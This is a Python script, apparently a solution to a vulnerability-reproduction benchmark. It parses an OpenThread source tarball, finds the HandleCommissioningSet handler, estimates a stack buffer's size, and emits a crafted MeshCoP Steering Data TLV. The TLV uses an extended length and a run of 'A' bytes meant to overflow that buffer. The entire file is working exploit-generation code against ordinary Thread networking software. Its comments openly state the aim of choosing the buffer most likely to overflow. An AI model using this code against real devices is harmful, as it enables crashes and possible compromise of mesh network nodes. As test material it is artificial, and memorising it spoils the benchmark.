import io
import os
import re
import tarfile
from typing import Dict, Optional, Tuple, List


class Solution:
    def __init__(self) -> None:
        self._cached: Optional[bytes] = None

    def solve(self, src_path: str) -> bytes:
        if self._cached is not None:
            return self._cached

        members = self._read_tar_members(src_path)
        consts = self._extract_constants(members)
        func_body = self._find_handle_commissioning_set_body(members)

        buf_size = self._infer_stack_buffer_size(func_body, consts)
        if buf_size is None:
            n = 840
        else:
            n = max(256, buf_size + 8)
            if n < 0:
                n = 840
            elif n > 10000:
                n = 840

        tlv_type = self._infer_steering_data_type(members)  # best-guess; safe fallback used
        poc = bytes([tlv_type, 0xFF]) + int(n).to_bytes(2, "big") + (b"A" * n)
        self._cached = poc
        return poc

    def _read_tar_members(self, src_path: str) -> List[Tuple[str, bytes]]:
        # Support direct tarball path, or a directory containing one.
        tar_path = src_path
        if os.path.isdir(src_path):
            candidates = []
            for fn in os.listdir(src_path):
                if fn.endswith((".tar", ".tar.gz", ".tgz", ".tar.bz2", ".tbz2", ".tar.xz", ".txz")):
                    candidates.append(os.path.join(src_path, fn))
            if candidates:
                candidates.sort(key=lambda p: os.path.getsize(p) if os.path.exists(p) else 0, reverse=True)
                tar_path = candidates[0]

        members: List[Tuple[str, bytes]] = []
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                if not any(name.endswith(ext) for ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx")):
                    continue
                if m.size <= 0 or m.size > 4_000_000:
                    continue
                f = tf.extractfile(m)
                if f is None:
                    continue
                try:
                    data = f.read()
                except Exception:
                    continue
                if not data:
                    continue
                members.append((name, data))
        return members

    def _extract_constants(self, members: List[Tuple[str, bytes]]) -> Dict[str, int]:
        consts: Dict[str, int] = {}

        def add(name: str, val: int) -> None:
            if not name:
                return
            if name in consts:
                return
            consts[name] = val

        def parse_int(s: str) -> Optional[int]:
            s = s.strip()
            if not s:
                return None
            s = s.rstrip("uUlL")
            try:
                if s.lower().startswith("0x"):
                    return int(s, 16)
                return int(s, 10)
            except Exception:
                return None

        rx_define = re.compile(r"^[ \t]*#define[ \t]+([A-Za-z_]\w*)[ \t]+([0-9]+|0x[0-9A-Fa-f]+)[ \t]*(?:$|/[*]|//)", re.M)
        rx_constexpr = re.compile(
            r"\b(?:static\s+)?(?:constexpr|const)\s+(?:unsigned\s+)?(?:long\s+long|long|int|short|uint(?:8|16|32|64)_t|size_t)\s+([A-Za-z_]\w*)\s*=\s*([0-9]+|0x[0-9A-Fa-f]+)\b"
        )
        rx_enum_block = re.compile(r"\benum\b[^{};]*\{([^}]*)\}", re.S)
        rx_enum_item = re.compile(r"([A-Za-z_]\w*)\s*=\s*([0-9]+|0x[0-9A-Fa-f]+)")

        for name, data in members:
            try:
                text = data.decode("utf-8", errors="ignore")
            except Exception:
                continue

            for m in rx_define.finditer(text):
                k = m.group(1)
                v = parse_int(m.group(2))
                if v is not None:
                    add(k, v)

            for m in rx_constexpr.finditer(text):
                k = m.group(1)
                v = parse_int(m.group(2))
                if v is not None:
                    add(k, v)

            for m in rx_enum_block.finditer(text):
                block = m.group(1)
                for em in rx_enum_item.finditer(block):
                    k = em.group(1)
                    v = parse_int(em.group(2))
                    if v is not None:
                        add(k, v)

        # Add common OpenThread MeshCoP TLV type numbers if present
        # Steering Data TLV is 8 in many implementations.
        add("kSteeringData", 8)
        add("kBorderAgentLocator", 9)
        add("kCommissionerSessionId", 13)
        add("kJoinerUdpPort", 18)

        return consts

    def _find_handle_commissioning_set_body(self, members: List[Tuple[str, bytes]]) -> str:
        # Find definition containing "HandleCommissioningSet" and return its body.
        for path, data in members:
            if b"HandleCommissioningSet" not in data:
                continue
            text = data.decode("utf-8", errors="ignore")
            idx = text.find("HandleCommissioningSet")
            if idx < 0:
                continue

            # Find the start of function after the name.
            # We want the first '{' after a ')'
            start = text.find("{", idx)
            if start < 0:
                continue

            # Basic brace matching.
            depth = 0
            end = None
            for i in range(start, len(text)):
                c = text[i]
                if c == "{":
                    depth += 1
                elif c == "}":
                    depth -= 1
                    if depth == 0:
                        end = i + 1
                        break
            if end is None:
                continue
            body = text[start:end]
            # Heuristic: ensure it looks like the intended function, not a comment or declaration.
            if "HandleCommissioningSet" in text[max(0, idx - 200): idx + 200] and ("return" in body or "Exit" in body):
                return body
        return ""

    def _infer_stack_buffer_size(self, func_body: str, consts: Dict[str, int]) -> Optional[int]:
        if not func_body:
            return None

        # Capture local arrays
        # Example: uint8_t buf[256]; or uint8_t buf[kMaxFoo];
        rx_arr = re.compile(
            r"\b(?:uint8_t|uint16_t|uint32_t|uint64_t|int8_t|int16_t|int32_t|int64_t|char|unsigned\s+char)\s+([A-Za-z_]\w*)\s*\[\s*([^\]]+?)\s*\]\s*;",
            re.S,
        )

        var_sizes: Dict[str, int] = {}
        for m in rx_arr.finditer(func_body):
            var = m.group(1)
            expr = m.group(2).strip()
            size = self._eval_c_int_expr(expr, consts)
            if size is None:
                # handle qualified constant: Foo::kBar
                if "::" in expr:
                    size = self._eval_c_int_expr(expr.split("::")[-1].strip(), consts)
            if size is None:
                continue
            if 0 < size <= 65535:
                var_sizes[var] = size

        if not var_sizes:
            return None

        # Identify which arrays are used as destinations in reads/memcpy-like operations.
        # Prefer names suggesting dataset/tlv/commission.
        preferred = []
        other = []
        for var, size in var_sizes.items():
            lname = var.lower()
            score = 0
            for kw, w in (("tlv", 5), ("dataset", 5), ("commission", 6), ("data", 1), ("buf", 1), ("buffer", 2), ("payload", 2)):
                if kw in lname:
                    score += w
            if score > 0:
                preferred.append((score, size, var))
            else:
                other.append((score, size, var))

        # Further filter: look for usage patterns.
        def used_as_dest(v: str) -> bool:
            # aMessage.Read(..., v, ...)
            if re.search(r"\.\s*Read\s*\(\s*[^,]+,\s*" + re.escape(v) + r"\s*,", func_body):
                return True
            if re.search(r"\bmem(?:cpy|move)\s*\(\s*" + re.escape(v) + r"\s*,", func_body):
                return True
            if re.search(r"\bmemset\s*\(\s*" + re.escape(v) + r"\s*,", func_body):
                return True
            return False

        used_preferred = [(sc, sz, v) for (sc, sz, v) in preferred if used_as_dest(v)]
        used_other = [(sc, sz, v) for (sc, sz, v) in other if used_as_dest(v)]

        candidates = used_preferred or used_other or preferred or other
        # Choose the smallest plausible stack buffer (more likely to overflow).
        candidates.sort(key=lambda t: (-(t[0]), t[1]))
        # we want smallest size among highest scores; group by max score
        max_score = candidates[0][0]
        top = [t for t in candidates if t[0] == max_score]
        top.sort(key=lambda t: t[1])
        chosen = top[0][1]

        # If chosen is tiny (e.g., 8 bytes) it might not be related; then choose a more plausible one.
        if chosen < 32:
            plausible = [sz for (_, sz, _) in candidates if 64 <= sz <= 4096]
            if plausible:
                chosen = min(plausible)

        return chosen if chosen > 0 else None

    def _eval_c_int_expr(self, expr: str, consts: Dict[str, int]) -> Optional[int]:
        expr = expr.strip()
        if not expr:
            return None

        # Remove casts like (uint16_t)
        expr = re.sub(r"\(\s*(?:unsigned\s+)?(?:long\s+long|long|int|short|uint(?:8|16|32|64)_t|size_t|char|unsigned\s+char)\s*\)", "", expr)

        # Reject sizeof, alignof, template stuff, or pointer arithmetic
        if "sizeof" in expr or "alignof" in expr:
            return None
        if "?" in expr or ":" in expr:
            return None

        # Tokenize
        token_re = re.compile(r"""
            (0x[0-9A-Fa-f]+|\d+)
            |([A-Za-z_]\w*(?:::[A-Za-z_]\w*)*)
            |(<<|>>|[+\-*/()|&^~])
        """, re.X)
        tokens: List[str] = []
        for m in token_re.finditer(expr):
            tok = m.group(0)
            tokens.append(tok)
        if not tokens:
            return None

        # Shunting-yard to RPN
        prec = {
            "~": (5, "right"),
            "u+": (5, "right"),
            "u-": (5, "right"),
            "*": (4, "left"),
            "/": (4, "left"),
            "+": (3, "left"),
            "-": (3, "left"),
            "<<": (2, "left"),
            ">>": (2, "left"),
            "&": (1, "left"),
            "^": (0, "left"),
            "|": (-1, "left"),
        }

        def is_number(t: str) -> bool:
            return bool(re.fullmatch(r"(?:0x[0-9A-Fa-f]+|\d+)", t))

        def is_ident(t: str) -> bool:
            return bool(re.fullmatch(r"[A-Za-z_]\w*(?:::[A-Za-z_]\w*)*", t))

        def to_value(t: str) -> Optional[int]:
            if is_number(t):
                if t.lower().startswith("0x"):
                    return int(t, 16)
                return int(t, 10)
            if is_ident(t):
                name = t.split("::")[-1]
                return consts.get(name)
            return None

        output: List[str] = []
        ops: List[str] = []
        prev_was_value = False

        i = 0
        while i < len(tokens):
            t = tokens[i]
            if is_number(t) or is_ident(t):
                output.append(t)
                prev_was_value = True
            elif t == "(":
                ops.append(t)
                prev_was_value = False
            elif t == ")":
                while ops and ops[-1] != "(":
                    output.append(ops.pop())
                if not ops or ops[-1] != "(":
                    return None
                ops.pop()
                prev_was_value = True
            else:
                # operator
                op = t
                if op in ("+", "-") and not prev_was_value:
                    op = "u+" if op == "+" else "u-"
                if op not in prec:
                    return None
                p, assoc = prec[op]
                while ops:
                    top = ops[-1]
                    if top == "(":
                        break
                    if top not in prec:
                        break
                    p2, _ = prec[top]
                    if (assoc == "left" and p <= p2) or (assoc == "right" and p < p2):
                        output.append(ops.pop())
                    else:
                        break
                ops.append(op)
                prev_was_value = False
            i += 1

        while ops:
            if ops[-1] in ("(", ")"):
                return None
            output.append(ops.pop())

        # Evaluate RPN
        stack: List[int] = []
        for t in output:
            if is_number(t) or is_ident(t):
                v = to_value(t)
                if v is None:
                    return None
                stack.append(int(v))
            else:
                if t in ("u+", "u-", "~"):
                    if not stack:
                        return None
                    a = stack.pop()
                    if t == "u+":
                        stack.append(+a)
                    elif t == "u-":
                        stack.append(-a)
                    else:
                        stack.append(~a)
                else:
                    if len(stack) < 2:
                        return None
                    b = stack.pop()
                    a = stack.pop()
                    if t == "+":
                        stack.append(a + b)
                    elif t == "-":
                        stack.append(a - b)
                    elif t == "*":
                        stack.append(a * b)
                    elif t == "/":
                        if b == 0:
                            return None
                        stack.append(a // b)
                    elif t == "<<":
                        if b < 0 or b > 63:
                            return None
                        stack.append(a << b)
                    elif t == ">>":
                        if b < 0 or b > 63:
                            return None
                        stack.append(a >> b)
                    elif t == "&":
                        stack.append(a & b)
                    elif t == "^":
                        stack.append(a ^ b)
                    elif t == "|":
                        stack.append(a | b)
                    else:
                        return None

        if len(stack) != 1:
            return None
        return stack[0]

    def _infer_steering_data_type(self, members: List[Tuple[str, bytes]]) -> int:
        # Try to find kSteeringData = <num> in MeshCoP TLV definitions; fallback to 8.
        rx = re.compile(r"\bkSteeringData\b\s*=\s*(0x[0-9A-Fa-f]+|\d+)\b")
        for path, data in members:
            if b"kSteeringData" not in data:
                continue
            text = data.decode("utf-8", errors="ignore")
            m = rx.search(text)
            if m:
                s = m.group(1)
                try:
                    return int(s, 16) if s.lower().startswith("0x") else int(s, 10)
                except Exception:
                    pass
        return 8